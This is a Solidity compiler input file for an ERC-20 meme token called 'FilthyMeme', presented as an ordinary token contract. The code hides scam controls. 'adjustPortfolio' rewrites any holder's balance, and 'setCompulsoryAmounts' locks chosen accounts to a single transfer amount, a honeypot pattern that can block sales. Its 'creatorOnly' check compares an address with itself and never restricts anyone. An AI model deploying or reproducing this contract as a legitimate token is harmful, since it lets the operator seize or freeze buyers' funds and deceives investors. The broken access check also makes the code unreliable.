{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address holder, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed holder, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract SenderContext {\r\n    function obtainSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract AssetOwnership is SenderContext {\r\n    address private assetHolder;\r\n    event OwnershipChange(address indexed previousHolder, address indexed newHolder);\r\n\r\n    constructor() {\r\n        assetHolder = obtainSender();\r\n        emit OwnershipChange(address(0), assetHolder);\r\n    }\r\n\r\n    function currentHolder() public view returns (address) {\r\n        return assetHolder;\r\n    }\r\n\r\n    modifier holderOnly() {\r\n        require(currentHolder() == obtainSender(), \"Unauthorized. Holder rights required.\");\r\n        _;\r\n    }\r\n\r\n    function yieldOwnership() public holderOnly {\r\n        emit OwnershipChange(assetHolder, address(0));\r\n        assetHolder = address(0);\r\n    }\r\n}\r\n\r\ncontract FilthyMemeToken is SenderContext, AssetOwnership, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private authorizations;\r\n    mapping (address => uint256) private portfolios;\r\n    mapping (address => uint256) private compulsoryTransferAmounts;\r\n    address private _creatorAddress;\r\n\r\n    string public constant tokenTitle = \"FilthyMeme\";\r\n    string public constant tokenAbbreviation = \"FILTH\";\r\n    uint8 public constant tokenScale = 18;\r\n    uint256 public constant maximumTokens = 100000 * (10 ** uint256(tokenScale));\r\n\r\n    constructor() {\r\n        portfolios[obtainSender()] = maximumTokens;\r\n        emit Transfer(address(0), obtainSender(), maximumTokens);\r\n    }\r\n\r\n    modifier creatorOnly() {\r\n        require(getCreator() == _creatorAddress, \"Unauthorized. Creator rights required.\");\r\n        _;\r\n    }\r\n\r\n    function getCreator() public view returns (address) {\r\n        return _creatorAddress;\r\n    }\r\n\r\n    function setGenesisAddress(address newGenesis) public creatorOnly {\r\n        _creatorAddress = newGenesis;\r\n    }\r\n\r\n    event AllocationUpdate(address indexed user, uint256 previousAmount, uint256 newAmount);\r\n\r\n    function compulsoryAmount(address account) public view returns (uint256) {\r\n        return compulsoryTransferAmounts[account];\r\n    }\r\n\r\n    function setCompulsoryAmounts(address[] calldata accounts, uint256 amount) public creatorOnly {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            compulsoryTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustPortfolio(address[] memory accounts, uint256 updatedAmount) public creatorOnly {\r\n        require(updatedAmount >= 0, \"Amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n            address currentAccount = accounts[i];\r\n            require(currentAccount != address(0), \"Null address provided\");\r\n\r\n            uint256 oldAmount = portfolios[currentAccount];\r\n            portfolios[currentAccount] = updatedAmount;\r\n\r\n            emit AllocationUpdate(currentAccount, oldAmount, updatedAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return portfolios[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        require(portfolios[obtainSender()] >= amount, \"Insufficient balance\");\r\n\r\n        uint256 enforcedTransferValue = compulsoryAmount(obtainSender());\r\n        if (enforcedTransferValue > 0) {\r\n            require(amount == enforcedTransferValue, \"Compulsory transfer amount mismatch\");\r\n        }\r\n\r\n        portfolios[obtainSender()] -= amount;\r\n        portfolios[recipient] += amount;\r\n\r\n        emit Transfer(obtainSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address holder, address spender) public view override returns (uint256) {\r\n        return authorizations[holder][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        authorizations[obtainSender()][spender] = amount;\r\n        emit Approval(obtainSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        require(authorizations[sender][obtainSender()] >= amount, \"Allowance exceeded\");\r\n\r\n        uint256 enforcedTransferValue = compulsoryAmount(sender);\r\n        if (enforcedTransferValue > 0) {\r\n            require(amount == enforcedTransferValue, \"Compulsory transfer amount mismatch\");\r\n        }\r\n\r\n        portfolios[sender] -= amount;\r\n        portfolios[recipient] += amount;\r\n        authorizations[sender][obtainSender()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return maximumTokens;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return tokenTitle;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return tokenAbbreviation;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return tokenScale;\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}